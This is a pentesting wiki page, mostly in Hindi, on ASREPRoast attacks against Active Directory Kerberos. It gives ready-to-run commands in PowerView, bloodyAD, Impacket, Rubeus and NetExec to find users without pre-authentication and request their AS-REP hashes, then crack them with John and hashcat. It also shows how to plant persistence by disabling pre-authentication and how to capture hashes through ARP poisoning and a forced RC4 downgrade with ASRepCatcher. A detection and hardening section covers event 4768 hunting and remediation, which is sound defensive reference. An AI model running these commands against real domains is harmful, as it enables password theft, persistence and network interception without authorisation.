# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक security attack है, जो उन users का फायदा उठाता है जिनमें **Kerberos pre-authentication required attribute** सक्षम नहीं होता। मूल रूप से, यह vulnerability attackers को user के password की ज़रूरत के बिना Domain Controller (DC) से उस user के लिए authentication का अनुरोध करने देती है। इसके बाद DC, user के password से बनी key से encrypted एक message भेजता है, जिसे attackers offline crack करके user का password पता करने की कोशिश कर सकते हैं।

इस attack के लिए मुख्य आवश्यकताएँ हैं:

- **Kerberos pre-authentication का अभाव**: Target users के लिए यह security feature सक्षम नहीं होना चाहिए।
- **Domain Controller (DC) से connection**: Requests भेजने और encrypted messages पाने के लिए attackers को DC तक access चाहिए।
- **वैकल्पिक domain account**: Domain account होने पर attackers LDAP queries के ज़रिए vulnerable users की अधिक कुशलता से पहचान कर सकते हैं। ऐसे account के बिना, attackers को usernames का अनुमान लगाना पड़ता है।

#### Vulnerable users की enumeration (domain credentials की ज़रूरत)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### AS_REP संदेश का अनुरोध

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus डिफ़ॉल्ट रूप से **RC4** request करता है, इसलिए Event ID **4768** आमतौर पर **preauth type 0** और **ticket encryption type 0x17** दिखाता है। अगर आप **`/aes`** जोड़ते हैं (या target के लिए RC4 disabled है), तो इसके बजाय **AES etypes** की अपेक्षा करें।<sup>[[2]](#references)</sup>

#### Quick one-liners (Linux)

- पहले संभावित targets enumerate करें (उदाहरण के लिए, leaked build paths से), Kerberos userenum के साथ: `kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec का उपयोग करके, valid creds के बिना पूरी username list को roast करें: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- अगर आपके पास creds हैं, तो NetExec से LDAP query करवाएँ और हर roastable account को आपके लिए request करवाएँ: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- अगर output **`$krb5asrep$23$`** से शुरू होता है, तो उसे Hashcat **`-m 18200`** से crack करें। अगर यह **`$krb5asrep$17$`** या **`$krb5asrep$18$`** से शुरू होता है, तो John **`--format=krb5asrep`** को प्राथमिकता दें।<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

यह न मानें कि हर AS-REP roast RC4 होता है। आधुनिक tooling, अनुरोधित/negotiated enctype के आधार पर **RC4** (`$krb5asrep$23$`) या **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) लौटा सकती है। **`hashcat -m 18200`** **etype 23** के लिए है, जबकि **John** `krb5asrep` को सीधे **17/18/23** के लिए handle करता है।<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistence

ऐसे user के लिए **preauth** की आवश्यकता न होने की setting लागू करें, जिस पर आपके पास **GenericAll** permissions हों (या properties लिखने की permissions हों):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Detection और hardening

**Preauthentication के बिना सफल AS-REP request** DC पर `Status=0x0` और `PreAuthType=0` के साथ **4768** event उत्पन्न करती है; यह request दर्ज करता है, इस बात का प्रमाण नहीं कि किसी ने response crack किया या account को compromise किया। Detection में RC4 को अनिवार्य न करें: `TicketEncryptionType=0x17` कमजोर encryption का एक उपयोगी संकेत है, लेकिन attacker AES (`0x11`/`0x12` event-log values) भी request कर सकता है। Windows Server 2016 और उसके बाद के संस्करणों में, January 14, 2025 (या नए) cumulative update के साथ, event 4768 का version 2 `ClientAdvertizedEncryptionTypes`, account/DC द्वारा supported etypes और उपलब्ध keys भी दिखाता है।<sup>[[5]](#references)</sup>

एक व्यावहारिक hunt में ऐसे client को flag करें जो केवल RC4 advertise करता हो, जबकि account के पास AES keys हों; फिर एक ही source IP से कई no-preauth users के लिए आए bursts को correlate करें। हर `PreAuthType=0` event पर alert करने के बजाय वैध exceptions का baseline बनाएं।

Attribution के लिए, `IpAddress` field को normalize करें (इसमें `::ffff:`-mapped IPv4 हो सकता है) और इसकी time window की तुलना 4769 service-ticket या 5140 share-access events से करें। इन events में उसी address से active accounts के नाम हो सकते हैं, लेकिन no-preauth AS-REP request के लिए किसी authenticated account की आवश्यकता नहीं होती। Shared hosts, NAT, proxies और multiple sessions के कारण IP का मेल यह **पहचान नहीं करता** कि AS-REQ किस व्यक्ति या account ने भेजा। संबंधित accounts को investigation leads मानें और endpoint या network evidence से पुष्टि करें।<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

स्थायी समाधान यह है कि उन सभी users के लिए **Do not require Kerberos preauthentication** को clear करें जिन्हें इसकी सख्त आवश्यकता नहीं है और उजागर हुए account passwords rotate करें। यदि किसी exception को हटाया नहीं जा सकता, तो लंबा, randomly generated password इस्तेमाल करें और privileges न्यूनतम रखें। RC4 को disable करने से cracking की लागत बढ़ती है, लेकिन roastability खत्म नहीं होती, क्योंकि AES AS-REP responses को भी offline crack किया जा सकता है।<sup>[[2]](#references)[[5]](#references)</sup>

## बिना credentials के ASREProast

On-path attacker सामान्य, preauthenticated AS exchange के दौरान लौटाए गए AS-REP को capture कर सकता है और उसके encrypted part को offline cracking के लिए format कर सकता है। Classic ASREPRoasting के विपरीत, इसके लिए `DONT_REQ_PREAUTH` की आवश्यकता नहीं होती; हालांकि, इससे केवल उन्हीं accounts का लाभ मिलता है जिनका Kerberos exchange वास्तव में intercept किया गया हो। **ASRepCatcher** default रूप से one-way ARP poisoning के ज़रिए यह position हासिल करता है, या `--disable-spoofing` के साथ किसी अन्य MitM technique से प्राप्त traffic का उपयोग कर सकता है।<sup>[[6]](#references)</sup>\
यदि आप no-preauth principal से **TGT** के बजाय **service ticket** लौटाने वाली संबंधित no-credential trick चाहते हैं, तो [Kerberoast](kerberoast.md) देखें।

`relay` mode में, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) intercepted AS-REQs को forward करता है और दोनों sides द्वारा अनुमति दिए जाने पर **RC4** लागू करता है। `listen` packets को नहीं बदलता, इसलिए यह वही enctype capture करता है जिस पर client और DC ने negotiation की हो। जब संभव हो, पूरे subnet को प्रभावित करने के बजाय `-t`/`-tf` से poisoning का scope तय करें।<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [AES AS-REPs की Roasting – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – इवेंट 4768: Kerberos authentication ticket का अनुरोध किया गया](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – सुरक्षा इवेंट 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – सुरक्षा इवेंट 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
